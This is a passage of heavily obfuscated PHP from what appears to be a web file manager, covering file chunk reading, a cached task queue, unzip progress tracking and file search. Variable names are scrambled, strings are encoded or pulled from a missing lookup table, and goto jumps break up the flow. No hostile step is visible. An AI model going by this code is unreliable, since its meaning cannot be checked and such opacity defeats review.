$ñĞÏÇ‡–[1531] => 0, $ñĞÏÇ‡–[76] => $ºÔ÷èŞñ[$ñĞÏÇ‡–[76]], $ñĞÏÇ‡–[1532] => $ºÔ÷èŞñ[$ñĞÏÇ‡–[1400]], $ñĞÏÇ‡–[1488] => $ºÔ÷èŞñ[$ñĞÏÇ‡–[85]], $ñĞÏÇ‡–[1487] => $ºÔ÷èŞñ[$ñĞÏÇ‡–[200]], $ñĞÏÇ‡–[1533] => 0, $ñĞÏÇ‡–[1534] => 0); } static $fileInfo = array(); public function info($‡øœ¹«¥) { $´£ÔĞ  = $_SERVER[Ã¶¡¶„æ][1535]; if (isset(self::$fileInfo[$‡øœ¹«¥])) { return self::$fileInfo[$‡øœ¹«¥]; } if (substr($‡øœ¹«¥, 0, strlen($´£ÔĞ )) != $´£ÔĞ ) { return !1; } self::$fileInfo[$‡øœ¹«¥] = IO::info(substr($‡øœ¹«¥, strlen($´£ÔĞ ))); return self::$fileInfo[$‡øœ¹«¥]; } public static function read($©ùú±œ¹, $Ÿ¥Ûâ, $äœƒËîÄ) { if (!isset(self::$_fopenCache[$©ùú±œ¹])) { $õ­§”ôÚ = new StreamWrapperIO(); $õ­§”ôÚ->stream_open($©ùú±œ¹); self::$_fopenCache[$©ùú±œ¹] = $õ­§”ôÚ; } $õ­§”ôÚ = self::$_fopenCache[$©ùú±œ¹]; return $õ­§”ôÚ->fileSubstr($Ÿ¥Ûâ, $äœƒËîÄ); } public static function _read($¤ÓºÑä, $Û•¬ŞöŒ, $›ÊüıÑó) { $‰¡éàÜÄ =& $_SERVER[Ã¶¡¶„æ]; $ƒºËşáÍ = fopen($¤ÓºÑä, $‰¡éàÜÄ[1404]); if (!$ƒºËşáÍ) { return $‰¡éàÜÄ[12]; } $Ó§š³‡ = 8192; fseek($ƒºËşáÍ, $Û•¬ŞöŒ, SEEK_SET); $æÆ­Üî® = $‰¡éàÜÄ[12]; $¹áß·ıä = 0; while ($¹áß·ıä < $›ÊüıÑó) { $ûìšØğ = min($Ó§š³‡, $›ÊüıÑó - $¹áß·ıä); $æÆ­Üî® .= fread($ƒºËşáÍ, $ûìšØğ); $¹áß·ıä += $ûìšØğ; } fclose($ƒºËşáÍ); return $æÆ­Üî®; } public function fileSubstr($æ¾µ£„ß, $ı™³¤©‚) { $±å˜£ÉÇ =& $_SERVER[Ã¶¡¶„æ]; $½ß³İ = $this->info[$±å˜£ÉÇ[76]]; $êïÌ«Êñ = $æ¾µ£„ß; $¶ƒÉšÆ = $ı™³¤©‚; if ($æ¾µ£„ß < 0) { $æ¾µ£„ß = $½ß³İ + $æ¾µ£„ß; } if ($ı™³¤©‚ === !1) { $ı™³¤©‚ = $½ß³İ - $æ¾µ£„ß; } if ($æ¾µ£„ß + $ı™³¤©‚ > $½ß³İ) { $ı™³¤©‚ = $½ß³İ - $æ¾µ£„ß; } if ($ı™³¤©‚ <= 0) { return $±å˜£ÉÇ[12]; } if ($æ¾µ£„ß < 0 || $æ¾µ£„ß >= $½ß³İ || $ı™³¤©‚ <= 0 || $ı™³¤©‚ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\151\154\x65\x52\x65\x61\x64\40\x65\x72\x72\157\162\41\40\x73\164\x61\x72\x74\75{$æ¾µ£„ß}\x3b\154\145\x6e\147\164\150\x3d{$ı™³¤©‚}\x3b\40\163\151\x7a\145\x3d{$½ß³İ}\x3b"); } $ºÛï¶ç³ = 64 * 1024; $¬ŸÑ•¥± =& self::$_chunkBuffer[$this->path]; if (!$¬ŸÑ•¥±) { $¬ŸÑ•¥± = array(); } $÷ÛØ•œ = 0; $Ø²¢úû¬ = 0; $ß–Ô•è = $±å˜£ÉÇ[12]; foreach ($¬ŸÑ•¥± as $÷ÛØ•œ => $ß–Ô•è) { $÷ÛØ•œ = intval($÷ÛØ•œ); $Ø²¢úû¬ = $÷ÛØ•œ + strlen($ß–Ô•è); if ($æ¾µ£„ß >= $Ø²¢úû¬) { continue; } if ($æ¾µ£„ß >= $÷ÛØ•œ && $æ¾µ£„ß + $ı™³¤©‚ <= $Ø²¢úû¬) { return substr($ß–Ô•è, $æ¾µ£„ß - $÷ÛØ•œ, $ı™³¤©‚); } break; } if (count($¬ŸÑ•¥±) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($±å˜£ÉÇ[1536], $±å˜£ÉÇ[1537] . count($¬ŸÑ•¥±) . "\x3b\x73\x74\x61\x72\164\75{$æ¾µ£„ß}\x2c\154\x65\156\x67\164\x68\75{$ı™³¤©‚}\73\x70\x6f\163\145\x3a{$÷ÛØ•œ}\x7e{$Ø²¢úû¬}"); throw new Exception($±å˜£ÉÇ[1538]); } $ñÑˆ«¿ = intval($æ¾µ£„ß / $ºÛï¶ç³) * $ºÛï¶ç³; $ÖÛ¨´âÎ = ceil(($æ¾µ£„ß + $ı™³¤©‚) / $ºÛï¶ç³) * $ºÛï¶ç³ - $ñÑˆ«¿; $şõ„Ÿşù = IO::fileSubstr($this->path, $ñÑˆ«¿, $ÖÛ¨´âÎ); $¬ŸÑ•¥±[$ñÑˆ«¿ . $±å˜£ÉÇ[12]] = $şõ„Ÿşù; ksort($¬ŸÑ•¥±); $ëØŠŒ = substr($şõ„Ÿşù, $æ¾µ£„ß - $ñÑˆ«¿, $ı™³¤©‚); return $ëØŠŒ; } private function log($Ô ¤ìÏÓ, $‚°ûş÷) { $Ÿ…ííºÎ =& $_SERVER[Ã¶¡¶„æ]; $ªİ¢Ïİ„ = timeFloat() - $this->timeStart; write_log(sprintf($Ÿ…ííºÎ[1539], $Ô ¤ìÏÓ, $this->info[$Ÿ…ííºÎ[32]], $ªİ¢Ïİ„, $‚°ûş÷), $Ÿ…ííºÎ[1197]); } } class Message { function __construct() { } public function send($ÉìÕô±à = '', $œ²µ°ìÀ = array(), $Í”ÖÃ‹ = "\164\145\170\164") { $Å—®ºÇø =& $_SERVER[Ã¶¡¶„æ]; $À¨À§ó = array($Å—®ºÇø[33] => $Å—®ºÇø[1540], $Å—®ºÇø[761] => $ÉìÕô±à); if (in_array($Í”ÖÃ‹, array($Å—®ºÇø[1540], $Å—®ºÇø[1541]))) { $À¨À§ó[$Å—®ºÇø[33]] = $Í”ÖÃ‹; } $œ²µ°ìÀ = array($Å—®ºÇø[515] => isset($œ²µ°ìÀ[$Å—®ºÇø[515]]) ? $œ²µ°ìÀ[$Å—®ºÇø[515]] : $Å—®ºÇø[12], $Å—®ºÇø[600] => isset($œ²µ°ìÀ[$Å—®ºÇø[600]]) ? $œ²µ°ìÀ[$Å—®ºÇø[600]] : $Å—®ºÇø[12]); if (empty($ÉìÕô±à) || empty($œ²µ°ìÀ[$Å—®ºÇø[515]]) && empty($œ²µ°ìÀ[$Å—®ºÇø[600]])) { return !1; } $õåßæê = array($Å—®ºÇø[1481] => $À¨À§ó, $Å—®ºÇø[1542] => $œ²µ°ìÀ); Hook::trigger($Å—®ºÇø[1543], $õåßæê); } } goto AŠ‚–ª¼Ë; cÔá÷ŒÍ£: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\x51\x75\145\x75\145\x4c\145\x6e\147\x74\x68"; const QUEUE_DATA = "\x74\x61\163\153\121\165\145\165\145\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($ìÖ¾÷È, $«ÔñÂ£‚ = array(), $ëøÓ„ ‡ = '', $æÕ¹ğ‹Æ = '') { $€©î×æî =& $_SERVER[Ã¶¡¶„æ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($æÕ¹ğ‹Æ && array_find_by_field(self::$listData, $€©î×æî[94], $æÕ¹ğ‹Æ)) { return !0; } self::$listData[] = array($€©î×æî[264] => $ìÖ¾÷È, $€©î×æî[1774] => $«ÔñÂ£‚, $€©î×æî[453] => $ëøÓ„ ‡, $€©î×æî[94] => $æÕ¹ğ‹Æ); return !0; } public static function addSubmit() { $ÄÇü—¯İ =& $_SERVER[Ã¶¡¶„æ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ÄÇü—¯İ[1775] . json_encode_force(array_to_keyvalue(self::$listData, $ÄÇü—¯İ[12], $ÄÇü—¯İ[453])), $ÄÇü—¯İ[1776]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Æ÷ïø›Ä, $óÔØâ„Õ = array(), $ããó•ùÙ = '', $£½ş®Ü© = '') { $†©€ã”» =& $_SERVER[Ã¶¡¶„æ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ü‚™Õ = self::getAll(); if ($£½ş®Ü© && array_find_by_field($Ü‚™Õ, $†©€ã”»[94], $£½ş®Ü©)) { return !0; } $Ü‚™Õ[] = array($†©€ã”»[264] => $Æ÷ïø›Ä, $†©€ã”»[1774] => $óÔØâ„Õ, $†©€ã”»[453] => $ããó•ùÙ, $†©€ã”»[94] => $£½ş®Ü©); write_log($†©€ã”»[1775] . $ããó•ùÙ, $†©€ã”»[1776]); self::setAll($Ü‚™Õ); return !0; } public static function run() { $¤î¼ğ­“ =& $_SERVER[Ã¶¡¶„æ]; $ÙÆï©« = self::getAll(); $é“êíœ˜ = array_shift($ÙÆï©«); if (!$é“êíœ˜) { return !1; } self::setAll($ÙÆï©«); $¾êÒÍ‘Ã = timeFloat(); try { Hook::apply($é“êíœ˜[$¤î¼ğ­“[264]], $é“êíœ˜[$¤î¼ğ­“[1774]]); } catch (Exception $§»ûñÇ¢) { } $´ì²ïİí = number_format(timeFloat() - $¾êÒÍ‘Ã, 3) . $¤î¼ğ­“[1692]; write_log($¤î¼ğ­“[1777] . $é“êíœ˜[$¤î¼ğ­“[453]] . $¤î¼ğ­“[1778] . $´ì²ïİí, $¤î¼ğ­“[1776]); return !0; } public static function count() { $Ï¦Œ¸İ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Ï¦Œ¸İ) { return 0; } return intval($Ï¦Œ¸İ); } public static function getAll() { $€¶ÚÅ“ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$€¶ÚÅ“) { return array(); } return $€¶ÚÅ“; } public static function setAll($¡Ñ”Ïì¿) { $½ İøÉˆ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¡Ñ”Ïì¿), $½ İøÉˆ); Cache::set(self::QUEUE_DATA, $¡Ñ”Ïì¿, $½ İøÉˆ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ªŸ¿È™ë, $»É‡¥¨ = 5.0) { if (!$ªŸ¿È™ë) { return; } $Øì…÷Öø = Cache::get($ªŸ¿È™ë); if (!$Øì…÷Öø || timeFloat() - floatVal($Øì…÷Öø) >= $»É‡¥¨) { Cache::set($ªŸ¿È™ë, timeFloat(), $»É‡¥¨ * 10); return !0; } return !1; } public static function timeLimitCall($ Àœó†, $Ü°«Ô˜¼, $ä®…½œş, $Î¹ĞíÂ¯ = 5.0) { $ŸëÍä®‹ =& $_SERVER[Ã¶¡¶„æ]; if (!$ Àœó† || !$Ü°«Ô˜¼) { return; } self::$asyncAdd = !0; $ ²ºá»Í = $ŸëÍä®‹[1779]; $ÓÉ±˜õÚ = Cache::get($ ²ºá»Í, !0); $¿”Äã² = array($ŸëÍä®‹[1780] => timeFloat(), $ŸëÍä®‹[1781] => timeFloat(), $ŸëÍä®‹[264] => $Ü°«Ô˜¼, $ŸëÍä®‹[1774] => $ä®…½œş, $ŸëÍä®‹[203] => $Î¹ĞíÂ¯); if (is_array($ÓÉ±˜õÚ[$ Àœó†])) { $¿”Äã²[$ŸëÍä®‹[1781]] = $ÓÉ±˜õÚ[$ Àœó†][$ŸëÍä®‹[1781]]; } if (is_array($ÓÉ±˜õÚ[$ Àœó†])) { if (timeFloat() - $ÓÉ±˜õÚ[$ Àœó†][$ŸëÍä®‹[1780]] < $¿”Äã²[$ŸëÍä®‹[203]] * 0.3) { return; } $¿”Äã²[$ŸëÍä®‹[1781]] = $ÓÉ±˜õÚ[$ Àœó†][$ŸëÍä®‹[1781]]; } $ÓÉ±˜õÚ[$ Àœó†] = $¿”Äã²; Cache::set($ ²ºá»Í, $ÓÉ±˜õÚ, 60); Cache::removeMemory($ ²ºá»Í); write_log($ŸëÍä®‹[1782] . $ Àœó† . $ŸëÍä®‹[71] . $Ü°«Ô˜¼, $ŸëÍä®‹[1776]); } public static function timeLimitCallLoop() { $•¤ƒçœË =& $_SERVER[Ã¶¡¶„æ]; $¹·‚¿öº = array($•¤ƒçœË[1783]); $–Á¡Ä‚Ó = in_array(strtolower(ACTION), $¹·‚¿öº); if (!$–Á¡Ä‚Ó && !self::$asyncAdd) { return; } $¹©¯ÍĞ“ = $•¤ƒçœË[1779]; $Âîí¾çï = Cache::get($¹©¯ÍĞ“, !0); if (!$Âîí¾çï || count($Âîí¾çï) <= 0) { return; } $œ¸“· = !1; $ ‹å¸œ¤ = timeFloat(); $èÛ¦¶ëÙ = array(); foreach ($Âîí¾çï as $¯«ô‚ñº => $Ş‰Šœá›) { if ($ ‹å¸œ¤ - $Ş‰Šœá›[$•¤ƒçœË[1781]] > $Ş‰Šœá›[$•¤ƒçœË[203]]) { $œ¸“· = !0; try { Hook::apply($Ş‰Šœá›[$•¤ƒçœË[264]], $Ş‰Šœá›[$•¤ƒçœË[1774]]); write_log($•¤ƒçœË[1784] . $¯«ô‚ñº . $•¤ƒçœË[71] . $Ş‰Šœá›[$•¤ƒçœË[264]] . $•¤ƒçœË[1785] . ACTION, $•¤ƒçœË[1776]); } catch (Exception $µ±±µ­µ) { } continue; } $èÛ¦¶ëÙ[$¯«ô‚ñº] = $Ş‰Šœá›; } if (!$œ¸“·) { return; } if (!$èÛ¦¶ëÙ) { return Cache::remove($¹©¯ÍĞ“); } Cache::set($¹©¯ÍĞ“, $èÛ¦¶ëÙ, 60); Cache::removeMemory($¹©¯ÍĞ“); } public static function finished($ĞÑ‚ñ¦, $úÚà°) { $÷—“á½à =& $_SERVER[Ã¶¡¶„æ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($÷—“á½à[264] => $ĞÑ‚ñ¦, $÷—“á½à[1774] => $úÚà°); } private static function finishedRun() { $³İÁ’Ü =& $_SERVER[Ã¶¡¶„æ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ŠÂÎò“¥) { try { Hook::apply($ŠÂÎò“¥[$³İÁ’Ü[264]], $ŠÂÎò“¥[$³İÁ’Ü[1774]]); } catch (Exception $Ó—‡ôÁ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $´•ˆ³½¢ =& $_SERVER[Ã¶¡¶„æ]; parent::startAfter(); Hook::bind($´•ˆ³½¢[1786], array($this, $´•ˆ³½¢[1787])); Hook::bind($´•ˆ³½¢[1208], array($this, $´•ˆ³½¢[1788])); $¨¥²Óü =& $this->task; $¨¥²Óü[$´•ˆ³½¢[1789]] = $´•ˆ³½¢[1209]; if (!$¨¥²Óü[$´•ˆ³½¢[1576]]) { $¨¥²Óü[$´•ˆ³½¢[1576]] = LNG($´•ˆ³½¢[1790]); } } protected function endAfter() { $º¹ôç¢û =& $_SERVER[Ã¶¡¶„æ]; parent::endAfter(); Hook::unbind($º¹ôç¢û[1786], array($this, $º¹ôç¢û[1787])); Hook::unbind($º¹ôç¢û[1208], array($this, $º¹ôç¢û[1788])); } public function updateAfter() { $œ’¦ÚÜ =& $_SERVER[Ã¶¡¶„æ]; $°»ãŸ— =& $this->task; if (!$°»ãŸ—[$œ’¦ÚÜ[792]] || !$°»ãŸ—[$œ’¦ÚÜ[769]]) { return; } if ($°»ãŸ—[$œ’¦ÚÜ[1789]] == $œ’¦ÚÜ[1209]) { $ˆÊËÑåï = 0; if ($°»ãŸ—[$œ’¦ÚÜ[1729]]) { $ˆÊËÑåï = $°»ãŸ—[$œ’¦ÚÜ[1730]] / $°»ãŸ—[$œ’¦ÚÜ[1729]]; } $°»ãŸ—[$œ’¦ÚÜ[1678]] = $ˆÊËÑåï * 0.3; } else { if ($°»ãŸ—[$œ’¦ÚÜ[1789]] == $œ’¦ÚÜ[313]) { $ˆÊËÑåï = $°»ãŸ—[$œ’¦ÚÜ[1677]] / $°»ãŸ—[$œ’¦ÚÜ[792]]; $°»ãŸ—[$œ’¦ÚÜ[1678]] = 0.3 + $ˆÊËÑåï * 0.4; } else { if ($°»ãŸ—[$œ’¦ÚÜ[1789]] == $œ’¦ÚÜ[107]) { $ÀçÇ¹»É = 0; if ($°»ãŸ—[$œ’¦ÚÜ[1731]] == $œ’¦ÚÜ[107]) { $ÀçÇ¹»É = $°»ãŸ—[$œ’¦ÚÜ[1730]]; } $ˆÊËÑåï = ($°»ãŸ—[$œ’¦ÚÜ[1734]] + $ÀçÇ¹»É) / $°»ãŸ—[$œ’¦ÚÜ[769]]; $°»ãŸ—[$œ’¦ÚÜ[1678]] = 0.3 + 0.4 + $ˆÊËÑåï * 0.3; } } } if ($°»ãŸ—[$œ’¦ÚÜ[1678]] > 0) { $óÔ‹²‘¥ = timeFloat() - $°»ãŸ—[$œ’¦ÚÜ[1680]] - $°»ãŸ—[$œ’¦ÚÜ[1683]]; $°»ãŸ—[$œ’¦ÚÜ[1684]] = $óÔ‹²‘¥ * (1 - $°»ãŸ—[$œ’¦ÚÜ[1678]]) / $°»ãŸ—[$œ’¦ÚÜ[1678]]; } } public function addFile($ìµ¦„˜­) { $ò±û¤Îª =& $_SERVER[Ã¶¡¶„æ]; $ùôÏ‘•æ =& $this->task; $¾¤©Ø Ì = IO::info($ìµ¦„˜­); $ùôÏ‘•æ[$ò±û¤Îª[1727]] = $¾¤©Ø Ì[$ò±û¤Îª[32]]; $ùôÏ‘•æ[$ò±û¤Îª[1729]] = $¾¤©Ø Ì[$ò±û¤Îª[76]]; $ùôÏ‘•æ[$ò±û¤Îª[1730]] = 0; $ùôÏ‘•æ[$ò±û¤Îª[1078]] = $ò±û¤Îª[1750]; $ùôÏ‘•æ[$ò±û¤Îª[1731]] = $ò±û¤Îª[1209]; $ùôÏ‘•æ[$ò±û¤Îª[769]] = $¾¤©Ø Ì[$ò±û¤Îª[76]]; $ùôÏ‘•æ[$ò±û¤Îª[792]] = 1; $ãåê„©Ã = 0; $ùôÏ‘•æ[$ò±û¤Îª[1738]] = array($ò±û¤Îª[1739] => $ãåê„©Ã + 1, $ò±û¤Îª[420] => $¾¤©Ø Ì[$ò±û¤Îª[32]], $ò±û¤Îª[84] => $¾¤©Ø Ì[$ò±û¤Îª[84]], $ò±û¤Îª[519] => $¾¤©Ø Ì[$ò±û¤Îª[519]] ? $¾¤©Ø Ì[$ò±û¤Îª[519]] : $¾¤©Ø Ì[$ò±û¤Îª[84]]); $this->update(); } public function unzipAfter($Û³œêİ€) { $µœ¸±öÌ =& $_SERVER[Ã¶¡¶„æ]; $²†¾˜êä =& $this->task; $²†¾˜êä[$µœ¸±öÌ[1789]] = $µœ¸±öÌ[107]; $Ô¡¼çß = IO::infoWithChildren($Û³œêİ€); $Ø·Ù˜ø¢ = 0; $²†¾˜êä[$µœ¸±öÌ[1738]] = array($µœ¸±öÌ[1739] => $Ø·Ù˜ø¢ + 1, $µœ¸±öÌ[420] => $Ô¡¼çß[$µœ¸±öÌ[32]], $µœ¸±öÌ[84] => $Ô¡¼çß[$µœ¸±öÌ[84]], $µœ¸±öÌ[519] => $Ô¡¼çß[$µœ¸±öÌ[519]] ? $Ô¡¼çß[$µœ¸±öÌ[519]] : $Ô¡¼çß[$µœ¸±öÌ[84]]); if ($Ô¡¼çß[$µœ¸±öÌ[33]] == $µœ¸±öÌ[199]) { $²†¾˜êä[$µœ¸±öÌ[792]] = 1; } else { $²†¾˜êä[$µœ¸±öÌ[792]] = $Ô¡¼çß[$µœ¸±öÌ[79]][$µœ¸±öÌ[77]]; } $²†¾˜êä[$µœ¸±öÌ[1078]] = $µœ¸±öÌ[12]; $²†¾˜êä[$µœ¸±öÌ[1731]] = 0; $²†¾˜êä[$µœ¸±öÌ[1677]] = 0; $²†¾˜êä[$µœ¸±öÌ[1729]] = 0; $²†¾˜êä[$µœ¸±öÌ[1730]] = 0; $²†¾˜êä[$µœ¸±öÌ[1727]] = $µœ¸±öÌ[12]; $²†¾˜êä[$µœ¸±öÌ[1734]] = 0; $²†¾˜êä[$µœ¸±öÌ[769]] = $Ô¡¼çß[$µœ¸±öÌ[76]]; $this->update(); self::log($µœ¸±öÌ[1791] . json_encode(array($²†¾˜êä, $Ô¡¼çß))); } public function nameParse($Ş‡ì±­‘) { $ªûÕÆÅ =& $_SERVER[Ã¶¡¶„æ]; $ˆ”Ûáß =& $this->task; if ($ˆ”Ûáß[$ªûÕÆÅ[1789]] == $ªûÕÆÅ[1209]) { $ˆ”Ûáß[$ªûÕÆÅ[1789]] = $ªûÕÆÅ[313]; $ˆ”Ûáß[$ªûÕÆÅ[1734]] = 0; $ˆ”Ûáß[$ªûÕÆÅ[769]] = 0; } $„à«Ÿ£à = get_path_this($Ş‡ì±­‘); if (strstr($„à«Ÿ£à, $ªûÕÆÅ[10])) { $ˆ”Ûáß[$ªûÕÆÅ[1677]] += 1; $ˆ”Ûáß[$ªûÕÆÅ[792]] += 1; } $ˆ”Ûáß[$ªûÕÆÅ[1727]] = $Ş‡ì±­‘; $this->update(); } } goto bêåªÂË°´; càêÜÙœÂì: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ãËÔ¬ëğ) { $Õî¼ç¢“ =& $_SERVER[Ã¶¡¶„æ]; $®€¦ÓÄ¶ = KodIO::fileTypeList(); $ŠÌöÉÉ = $®€¦ÓÄ¶[$ãËÔ¬ëğ]; if (!$ŠÌöÉÉ) { return array(); } $ÎÚü‚ = $ŠÌöÉÉ[$Õî¼ç¢“[174]]; $¡ù Ã®ƒ = $Õî¼ç¢“[7]; if (!$ŠÌöÉÉ[$Õî¼ç¢“[174]]) { $‹›®®ç¥ = array_to_keyvalue($®€¦ÓÄ¶, $Õî¼ç¢“[12], $Õî¼ç¢“[174]); $ÎÚü‚ = implode($Õî¼ç¢“[50], $‹›®®ç¥); $¡ù Ã®ƒ = $Õî¼ç¢“[2116]; } $ù½ÛçÉ = explode($Õî¼ç¢“[50], trim($ÎÚü‚, $Õî¼ç¢“[50])); return array($¡ù Ã®ƒ, $ù½ÛçÉ); } public function listPathType($Ïõã˜Ø) { $ÔàóÚØ· =& $_SERVER[Ã¶¡¶„æ]; $‚” ¥¶Ã = $this->fileTypeWhere($Ïõã˜Ø); if (!$‚” ¥¶Ã) { return array(); } $”Ù•§ñë = USER_ID; $àùÁ©Á­ = Model($ÔàóÚØ·[535])->getInfo($”Ù•§ñë); $‹´ÄŸÓä = array($ÔàóÚØ·[586] => SourceModel::TYPE_USER, $ÔàóÚØ·[521] => array($ÔàóÚØ·[550], $ÔàóÚØ·[531] . $àùÁ©Á­[$ÔàóÚØ·[86]][$ÔàóÚØ·[402]] . $ÔàóÚØ·[551]), $ÔàóÚØ·[587] => $”Ù•§ñë, $ÔàóÚØ·[583] => 0, $ÔàóÚØ·[584] => $‚” ¥¶Ã); return $this->listSource($‹´ÄŸÓä); } public function listSearch($§Óà¥¤, $èµÇõÀ = 300) { $Ğ×…§¬‰ =& $_SERVER[Ã¶¡¶„æ]; if (isset($§Óà¥¤[$Ğ×…§¬‰[1959]]) && $§Óà¥¤[$Ğ×…§¬‰[1959]]) { $§Óà¥¤[$Ğ×…§¬‰[1959]] = str_replace($Ğ×…§¬‰[384], $Ğ×…§¬‰[2117], trim($§Óà¥¤[$Ğ×…§¬‰[1959]])); } $ÈØ¼Çşó = $this->_parseSearchWhere($§Óà¥¤); if (!isset($ÈØ¼Çşó[$Ğ×…§¬‰[431]])) { $ÈØ¼Çşó[$Ğ×…§¬‰[431]] = 0; } $ğê¤çç» = $Ğ×…§¬‰[2118]; $¨©íŒª— = $ÈØ¼Çşó; $´Íêé‰¿ = $ğê¤çç»; $this->_listSearchBindPinyin($§Óà¥¤, $ÈØ¼Çşó, $ğê¤çç»); $this->alias($Ğ×…§¬‰[446])->_makeOrder(); $ÈØ¼Çşó = $this->parseWhereLike($ÈØ¼Çşó); $Ë÷¦ô£Ô = $this->distinct(!0)->field($ğê¤çç»)->where($ÈØ¼Çşó)->selectPage($èµÇõÀ); if ($GLOBALS[$Ğ×…§¬‰[6]][$Ğ×…§¬‰[381]][$Ğ×…§¬‰[382]] && Input::check($§Óà¥¤[$Ğ×…§¬‰[1959]], $Ğ×…§¬‰[593]) && $Ë÷¦ô£Ô[$Ğ×…§¬‰[366]][$Ğ×…§¬‰[353]] == 1 && $Ë÷¦ô£Ô[$Ğ×…§¬‰[366]][$Ğ×…§¬‰[367]] == 0) { $Ë÷¦ô£Ô = $this->distinct(!0)->field($ğê¤çç»)->where($¨©íŒª—)->limit(1000)->select(); $Ë÷¦ô£Ô = array_page_split($Ë÷¦ô£Ô, !1, $èµÇõÀ); } $this->_listSearchFileContent($Ë÷¦ô£Ô, $§Óà¥¤, $´Íêé‰¿, $¨©íŒª—); $this->_listSearchDesc($Ë÷¦ô£Ô, $§Óà¥¤, $´Íêé‰¿); $this->_listSearchTag($Ë÷¦ô£Ô, $§Óà¥¤, $´Íêé‰¿); $this->_listSearchGroupTag($Ë÷¦ô£Ô, $§Óà¥¤, $´Íêé‰¿); $this->_listDataApply($Ë÷¦ô£Ô[$Ğ×…§¬‰[369]]); $this->_listMake($Ë÷¦ô£Ô); return $Ë÷¦ô£Ô; } private function _listSearchFileContent(&$ãÖëßÚ, $‰‘†ƒİş, $ğÇİü†Ù, $‚ªŸ£Â¾) { $Îâ·ñ×Ç =& $_SERVER[Ã¶¡¶„æ]; if (!$‰‘†ƒİş[$Îâ·ñ×Ç[1959]] || $ãÖëßÚ[$Îâ·ñ×Ç[366]][$Îâ·ñ×Ç[353]] > 1) { return; } if (!isset($‚ªŸ£Â¾[$Îâ·ñ×Ç[32]]) || !is_array($‰‘†ƒİş[$Îâ·ñ×Ç[468]])) { return; } $‚ªŸ£Â¾[$Îâ·ñ×Ç[468]] = array($Îâ·ñ×Ç[7], $‰‘†ƒİş[$Îâ·ñ×Ç[468]]); unset($‚ªŸ£Â¾[$Îâ·ñ×Ç[32]]); unset($‰‘†ƒİş[$Îâ·ñ×Ç[468]]); $ı¯¼¼²â = $this->field($ğÇİü†Ù)->where($‚ªŸ£Â¾)->limit($Îâ·ñ×Ç[2119])->select(); if (!$ı¯¼¼²â || count($ı¯¼¼²â) == 0) { return; } $ãÖëßÚ[$Îâ·ñ×Ç[369]] = array_merge($ı¯¼¼²â, $ãÖëßÚ[$Îâ·ñ×Ç[369]]); $ãÖëßÚ[$Îâ·ñ×Ç[366]][$Îâ·ñ×Ç[367]] += count($ı¯¼¼²â); } private function _listSearchTag(&$å‚„é¯ç, $ŒßŒçø, $ÒËË”Éº) { $ë…†è­ =& $_SERVER[Ã¶¡¶„æ]; if (!$ŒßŒçø[$ë…†è­[1959]] || $å‚„é¯ç[$ë…†è­[366]][$ë…†è­[353]] > 1) { return; } $ƒÉ½ñº’ = Model($ë…†è­[2120])->listData(); $Ï‰áæ’Å = array(); $¨Éõ£Ü = $ŒßŒçø[$ë…†è­[1959]]; foreach ($ƒÉ½ñº’ as $ëÜı©) { $¶‘¼¿´ = $ëÜı©[$ë…†è­[32]]; $ïáƒÓş = str_replace($ë…†è­[53], $ë…†è­[12], Pinyin::get($¶‘¼¿´)); if (stripos($¶‘¼¿´, $¨Éõ£Ü) !== !1 || stripos($ïáƒÓş, $¨Éõ£Ü) !== !1) { $Ï‰áæ’Å[] = $ëÜı©[$ë…†è­[399]]; } } if (!$Ï‰áæ’Å) { return; } $éãÑù­ = array($ë…†è­[426] => array($ë…†è­[7], $Ï‰áæ’Å), $ë…†è­[1676] => USER_ID); $ÈÇ¬­œİ = Model($ë…†è­[428])->field($ë…†è­[84])->where($éãÑù­)->select(); $ÈÇ¬­œİ = array_to_keyvalue($ÈÇ¬­œİ, $ë…†è­[12], $ë…†è­[84]); $ıÍÈ×È† = array_unique($ÈÇ¬­œİ); $this->_listSearchMerge($å‚„é¯ç, $ŒßŒçø, $ÒËË”Éº, $ıÍÈ×È†); } private function _listSearchDesc(&$È¥ ú•», $•®™ğ›‘, $‰¢‡öÒ) { $ÅñÎ¡³ğ =& $_SERVER[Ã¶¡¶„æ]; if (!$•®™ğ›‘[$ÅñÎ¡³ğ[1959]] || $È¥ ú•»[$ÅñÎ¡³ğ[366]][$ÅñÎ¡³ğ[353]] > 1) { return; } $Å½•ğ¬½ = array($ÅñÎ¡³ğ[94] => $ÅñÎ¡³ğ[453], $ÅñÎ¡³ğ[374] => array($ÅñÎ¡³ğ[383], $ÅñÎ¡³ğ[1961] . $•®™ğ›‘[$ÅñÎ¡³ğ[1959]] . $ÅñÎ¡³ğ[1961])); $ï²Àƒçë = !1; if ($ï²Àƒçë) { $×¥—Ñßö = $this->listSearchChildren($•®™ğ›‘[$ÅñÎ¡³ğ[432]]); $×¥—Ñßö = array_unique($×¥—Ñßö); if (!$×¥—Ñßö) { return; } $Å½•ğ¬½[$ÅñÎ¡³ğ[402]] = array($ÅñÎ¡³ğ[7], $×¥—Ñßö); } $ŠÏ‡Ü€ï = Model($ÅñÎ¡³ğ[569])->field($ÅñÎ¡³ğ[402])->where($Å½•ğ¬½)->limit(5000)->select(); $Ë”³ = array_to_keyvalue($ŠÏ‡Ü€ï, $ÅñÎ¡³ğ[12], $ÅñÎ¡³ğ[402]); $this->_listSearchMerge($È¥ ú•», 